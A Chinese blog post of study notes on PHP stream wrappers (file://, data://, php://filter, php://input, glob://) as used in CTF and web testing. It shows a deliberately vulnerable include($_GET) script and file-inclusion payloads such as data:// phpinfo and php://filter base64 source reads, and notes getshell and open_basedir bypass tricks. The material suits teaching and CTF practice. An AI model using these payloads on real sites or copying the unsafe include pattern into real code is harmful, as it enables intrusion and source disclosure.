<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>php伪协议的学习 | Na0H的神光棒存放地</title><meta name="keywords" content="学习笔记"><meta name="author" content="Na0H_1e3"><meta name="copyright" content="Na0H_1e3"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="就是php伪协议的学习啦（夹带了一点私货——某首歌）">
<meta property="og:type" content="article">
<meta property="og:title" content="php伪协议的学习">
<meta property="og:url" content="http://na0hblog.top/2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
<meta property="og:site_name" content="Na0H的神光棒存放地">
<meta property="og:description" content="就是php伪协议的学习啦（夹带了一点私货——某首歌）">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://na0hblog.top/img/atimg/11.jpg">
<meta property="article:published_time" content="2021-02-25T14:03:04.000Z">
<meta property="article:modified_time" content="2021-04-30T17:16:05.561Z">
<meta property="article:author" content="Na0H_1e3">
<meta property="article:tag" content="学习笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://na0hblog.top/img/atimg/11.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://na0hblog.top/2021/02/25/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>(function(c,l,a,r,i,t,y){
    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
})(window, document, "clarity", "script", "6hnvvhr9lc");</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'php伪协议的学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-05-01 01:16:05'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/atimg/11.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Na0H的神光棒存放地</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">php伪协议的学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-25T14:03:04.000Z" title="发表于 2021-02-25 22:03:04">2021-02-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-30T17:16:05.561Z" title="更新于 2021-05-01 01:16:05">2021-05-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><!-- more -->

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次接触php伪协议是请学长帮忙看的一个站所涉及到的glob伪协议<br>之前就有学习的念头，后来因为种种原因（主要是拖延症）拖了3个多月。。<br>最近刷web题的时候也接触很多，就仔细看一下</p>
<p>顺便安利首歌，为了放在这还学了一门新活</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1459439332&auto=0&height=66"></iframe>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 上面播放器的代码如下（仅网易云外链链接，其他播放器请自行百度）</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;330&quot;</span> <span class="attr">height</span>=<span class="string">&quot;86&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//music.163.com/outchain/player?type=1&amp;id=32069326&amp;auto=0&amp;height=66&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"># width(宽度) ; height(高度)</span><br><span class="line"># type = 歌曲(1) | 歌单(2) | 电台(3)</span><br><span class="line"># id = 歌曲ID号</span><br><span class="line"># auto = 自动播放(1) | 手动播放(0)</span><br></pre></td></tr></table></figure>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>虽说是为了解伪协议在渗透/ctf中的各种运用，但还是要去官方文档看看：</p>
<p>php支持的伪协议如下：（<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a>）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen等等和include等等函数对于伪协议的支持；<br>且allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的。</p>
</blockquote>
<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><ul>
<li><p>file:// — 访问本地文件系统；<br>ctf中常用于读取本地文件、配合curl_exec实现任意文件读取（curl支持伪协议）</p>
</li>
<li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p>
</li>
<li><p>运用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?xxx&#x3D;file:&#x2F;&#x2F;文件的绝对路径和文件名</span><br><span class="line"></span><br><span class="line">eg: ?xxx&#x3D;file:&#x2F;&#x2F;C:&#x2F;Users&#x2F;ls&#x2F;Desktop&#x2F;1.txt</span><br></pre></td></tr></table></figure>
<p>eg：file://读取+文件包含</p>
<blockquote>
<p>1.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hhh&#x27;</span>]))&#123;</span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hhh&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>1.txt：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>  <img src="https://i.loli.net/2021/02/24/g6w8WleFGKiBhQY.png" alt="成功读取并包含啦"></p>
<h2 id="http-、https"><a href="#http-、https" class="headerlink" title="http://、https://"></a>http://、https://</h2><ul>
<li><p>http:// – https:// — 访问 HTTP(s) 网址；允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源；<br>ctf中通常用于远程包含</p>
</li>
<li><p><code>allow_url_fopen</code>:on<br><code>allow_url_include</code> :on</p>
</li>
<li><p>运用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;file.php</span><br><span class="line">http:&#x2F;&#x2F;user:password@example.com</span><br></pre></td></tr></table></figure>
<p>eg:</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/02/24/PtXaz51VJiH8ujB.png" alt="先打开allow_url_fopen和allow_url_include"></p>
<p><img src="https://i.loli.net/2021/02/24/Zpq9OTWVRJvbMfo.png" alt="远程包含~"></p>
<h2 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://"></a>zip:// &amp; bzip2:// &amp; zlib://</h2><ul>
<li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响<br>zip:// 需<code>php版本&gt;=5.3.0</code></p>
</li>
<li><p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名，可修改为任意后缀</p>
</li>
<li><p>运用：</p>
<blockquote>
<p><code>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</code>- 处理的是 ‘.zip’ 后缀的压缩包里的文件<br>zip://archive.zip#dir/file.txt<br><code>compress.bzip2://绝对路径 | 相对路径</code> - 处理的是 ‘.bz2’ 后缀的压缩包<br>compress.bzip2://file.bz2<br><code>compress.zlib://绝对路径 | 相对路径</code>- 处理的是 ‘.gz’ 后缀的压缩包<br>compress.zlib://file.gz </p>
</blockquote>
</li>
</ul>
<h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><ul>
<li><p><code>allow_url_fopen</code> ：on<br><code>allow_url_include</code>：on<br><code>PHP版本 &gt;= 5.2</code></p>
</li>
<li><p>运用：<code>data:资源类型;编码,内容</code><br><code>?xxx=data://text/plain;base64,(base64编码的内容)</code>或：<code>?xxx=data:text/plain,(url编码的内容)</code></p>
</li>
</ul>
<blockquote>
<p>eg:</p>
<p>xxx.php?file=<code>data://</code>text/plain,<?php phpinfo()?></p>
<p>xxx.php?file=<code>data://</code>text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p>
<p>或(省略//)</p>
<p>xxx.php?file=<code>data:</code>text/plain,<?php phpinfo()?></p>
<p>xxx.php?file=<code>data:</code>text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p>
</blockquote>
<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><ul>
<li>php:// — 访问各个输入/输出流；<br>其中又有：<br>php://stdin、 php://stdout 、 php://stderr  （允许直接访问 PHP 进程相应的输入或者输出流）<br>php://input、php://output、php://filter<br>php://fd、php://memory、php://temp</li>
<li><code>php://filter</code>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响;<br><code>php://input</code>、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code>受限于<code>allow_url_include</code></li>
<li>允许读取：<code>php://stdin</code>、 <code>php://input</code>、 <code>php://fd</code>、 <code>php://memory</code> 、 <code>php://temp</code><br>允许写入|追加：<code>php://stdout</code>、 <code>php://stderr</code>、 <code>php://output</code>、 <code>php://fd</code>、 <code>php://memory</code>、<code>php://temp</code><br>允许同时读写：<code>php://fd</code>、 <code>php://memory</code> 、 <code>php://temp</code></li>
</ul>
<h3 id="php-fd"><a href="#php-fd" class="headerlink" title="php://fd"></a>php://fd</h3><p><code>php://fd</code> 允许直接访问指定的文件描述符。 如 <code>php://fd/3</code> 引用了文件描述符 3</p>
<h3 id="php-memory-和-php-temp"><a href="#php-memory-和-php-temp" class="headerlink" title="php://memory 和 php://temp"></a>php://memory 和 php://temp</h3><p><code>php://memory</code> 和 <code>php://temp</code> 是类似文件包装器的数据流，允许读写临时数据。<br> 两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中， 而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</p>
<p><code>php://temp</code> 的内存限制可通过添加 <code>/maxmemory:NN</code> 来控制，<code>NN</code> 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</p>
<h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</p>
<p>eg：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&quot;hhh&quot;</span>];  </span><br><span class="line">file_put_contents(<span class="variable">$code</span>,<span class="string">&quot;output success&quot;</span>);   </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/24/i82sXIxVFB5Cc4N.png"></p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><ul>
<li>php://input-可以访问请求的原始数据，POST请求的情况下php://input可以获取post的数据<br>ps：<code>enctype=&quot;multipart/form-data&quot;</code> 时 php://input 是无效的</li>
<li>需开启<code>allow_url_include</code></li>
<li>利用方法：<br>① 将要GET的参数?xxx=php://input<br>② 用post方法传入想要file_get_contents()函数返回的值</li>
</ul>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><ul>
<li><p>是一种元封装器，设计用于数据流打开时的筛选过滤应用。可用于读写文件、甚至getshell</p>
</li>
<li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p>
</li>
<li><p>参数如下：</p>
<table>
<thead>
<tr>
<th><strong>php://filter 参数</strong></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td>名称</td>
<td align="center">描述</td>
</tr>
<tr>
<td><code>resource=&lt;要过滤的数据流&gt;</code></td>
<td align="center">必须。它指定了你要筛选过滤的数据流</td>
</tr>
<tr>
<td><code>read=&lt;读链的筛选列表&gt;</code></td>
<td align="center">可选。可以设定一个或多个过滤器名称，以管道符（`</td>
</tr>
<tr>
<td><code>write=&lt;写链的筛选列表&gt;</code></td>
<td align="center">可选。可以设定一个或多个过滤器名称，以管道符（`</td>
</tr>
<tr>
<td><code>&lt;；两个链的筛选列表&gt;</code></td>
<td align="center">任何没有以<code>read=</code>或<code>write=</code>作前缀的筛选器列表会视情况应用于读或写链</td>
</tr>
</tbody></table>
</li>
<li><p>运用：<br>eg：<code>php://filter/read=convert.base64-encode/resource=hhh.php</code><br>使用了过滤器：<code>convert.base64-encode</code>：将输入流进行base64编码；<br><code>resource=hhh.php</code>：数据源自文件hhh.php，也就是读取hhh.php文件嘛</p>
</li>
</ul>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>官方文档<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p>
<h5 id="字符串过滤器-string"><a href="#字符串过滤器-string" class="headerlink" title="字符串过滤器(string.*)"></a>字符串过滤器(string.*)</h5><p>每个过滤器都正如其名字暗示的那样工作并与内置的 PHP 字符串函数的行为相对应</p>
<ul>
<li><p>string.rot13：对字符串执行 ROT13 转换；等同于用 <code>str_rot13()</code>函数处理所有的流数据</p>
<blockquote>
<p>ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p>
</blockquote>
</li>
<li><p>string.toupper：将字符串转化为大写；等同于用 <code>strtoupper()</code>函数处理所有的流数据</p>
</li>
<li><p>string.tolower：将字符串转化为小写；等同于用 <code>strtolower()</code>函数处理所有的流数据</p>
</li>
<li><p><strong>string.strip_tags</strong>：从字符串中去除 HTML 和 PHP 标记；等同于用 <code>strip_tags()</code>函数处理所有的流数据<br>从5.0.0启用——到7.3.0废弃，官方强烈建议不使用此特性；<br>原因就在于此特性引发的各种漏洞，这里大致看了两个：<br>1、使用<code>php://filter/string.strip_tags</code>导致php7 segment fault，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录(<code>&lt;php7.2</code>)，再进行文件名爆破就可以getshell。<a target="_blank" rel="noopener" href="https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/">例1：文件包含的一些getshell姿势 </a><br>2、PHP的标签本质上是一段xml代码，所以我们可以使用<code>php://filter</code>的<code>string.strip_tags</code>过滤器，去除这一段代码(<code>&lt;?php exit();?&gt;</code>)。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7852#toc-1">例2：某OK最新版漏洞组合拳GETSHELL </a></p>
</li>
</ul>
<h5 id="转换过滤器-convert"><a href="#转换过滤器-convert" class="headerlink" title="转换过滤器(convert.*)"></a>转换过滤器(convert.*)</h5><ul>
<li>自 PHP 5.0.0</li>
<li>base64：<ul>
<li><code>convert.base64-encode</code>：对数据进行base64编码；等同于用base64_encode()处理所有的流数据</li>
<li><code>convert.base64-decode</code>：对数据进行base64解码；等同于用base64_decode()处理所有的流数据<br>ps：<code>convert.base64-encode</code>支持以一个关联数组给出的参数<br>1、<code>line-length</code>：决定分隔步长；base64 输出将被 <code>line-length</code>个字符为长度而截成块<br>2、<code>line-break-chars</code>：决定分隔符；每块将被用给出的字符隔开<br>(这些参数的效果和用<code>base64_encode()</code>再加上<code>chunk_split()</code>相同)</li>
</ul>
</li>
<li>quoted-printable（ASCII码二进制形式）：<ul>
<li><code>convert.quoted-printable-encode</code>：将 quoted-printable 字符串转换为 8-bit 二进制字符串；等同于用 quoted_printable_decode()函数处理所有的流数据</li>
<li><code>convert.quoted-printable-decode</code>：没有和 convert.quoted-printable-encode相对应的函数<br>ps：<code>convert.quoted-printable-encode</code>支持以一个关联数组给出的参数。<br>1、<code>convert.quoted-printable-encode</code>：<code>line-length</code>、<code>line-break-chars</code>还有布尔参数 <code>binary</code>和 <code>force-encode-first</code><br>2、<code>convert.base64-decode</code>只支持 <code>line-break-chars</code>参数（作为从编码载荷中剥离的类型提示）</li>
</ul>
</li>
</ul>
<h5 id="压缩过滤器-zlib-bzip2"><a href="#压缩过滤器-zlib-bzip2" class="headerlink" title="压缩过滤器(zlib | bzip2.*)"></a>压缩过滤器(zlib | bzip2.*)</h5><p>ps：压缩过滤器 不产生命令行工具如 <code>gzip</code>的头和尾信息。只是压缩和解压数据流中的有效载荷部分</p>
<ul>
<li>自 PHP 5.1.0；</li>
<li><code>zlib.deflate（压缩）</code>、 <code>zlib.inflate（解压）</code><br><code>deflate</code>过滤器可以接受以一个关联数组传递的最多<strong>三</strong>个参数：<br>1、<code>level</code>：定义压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。其中：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）<br>2、<code>window</code>：是压缩回溯窗口大小，以二的次方表示（默认为15）。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。<br>3、<code>memory</code>用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。</li>
<li><code>bzip2.compress</code>和 <code>bzip2.decompress</code>工作的方式与上面讲的 zlib 过滤器相同。 <ul>
<li><code>bzip2.compress</code>接受以一个关联数组给出的最多<strong>两</strong>个参数：<br>1、<code>blocks</code>：(1-9)，指定分配多少个 100K 字节的内存块作为工作区<br>2、<code>work</code>：(0-250)，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法</li>
<li><code>bzip2.decompress</code>仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的 <code>small</code>单元传递。当 <code>small</code>设为 <code>&amp;true; 值</code>时，指示 bzip 库用最小的内存占用来执行解压缩，代价是速度会慢一些。</li>
</ul>
</li>
</ul>
<h5 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h5><ul>
<li><code>mcrypt.*</code>、<code>mdecrypt.*</code>使用 libmcrypt 提供对称的加密和解密<br>支持 mcrypt 扩展库中相同的算法，格式为 <code>mcrypt.ciphername</code><br>(<code>ciphername</code>是密码的名字,将被传递给 mcrypt_module_open())</li>
<li>mcrypt 过滤器参数：<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">是否必须</th>
<th align="left">默认值</th>
<th align="left">取值举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">mode</td>
<td align="left">可选</td>
<td align="left">cbc</td>
<td align="left">cbc, cfb, ecb, nofb, ofb, stream</td>
</tr>
<tr>
<td align="left">algorithms_dir</td>
<td align="left">可选</td>
<td align="left">ini_get(‘mcrypt.algorithms_dir’)</td>
<td align="left">algorithms 模块的目录</td>
</tr>
<tr>
<td align="left">modes_dir</td>
<td align="left">可选</td>
<td align="left">ini_get(‘mcrypt.modes_dir’)</td>
<td align="left">modes 模块的目录</td>
</tr>
<tr>
<td align="left">iv</td>
<td align="left">必须</td>
<td align="left">N/A</td>
<td align="left">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td>
</tr>
<tr>
<td align="left">key</td>
<td align="left">必须</td>
<td align="left">N/A</td>
<td align="left">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="glob"><a href="#glob" class="headerlink" title="glob://"></a>glob://</h2><ul>
<li><p>glob:// — 查找匹配的文件路径模式</p>
</li>
<li><p>PHP版本&gt;=5.3.0</p>
</li>
<li><p>运用：（这里是学长教的hh）</p>
<p><strong>设计缺陷导致的任意文件名列出</strong>：由于PHP在设计的时候（可以通过源码来进行分析），对于glob伪协议的实现过程中不检测open_basedir以及safe_mode也是不会检测的，由此可利用glob://罗列文件名<br>（也就是说在可读权限下，可以得到文件名，但无法读取文件内容；也就是单纯的罗列目录，能用来绕过open_basedir）</p>
</li>
</ul>
<h3 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob://"></a>scandir()+glob://</h3><p>  只能列出根目录以及open_basedir()允许目录下的文件</p>
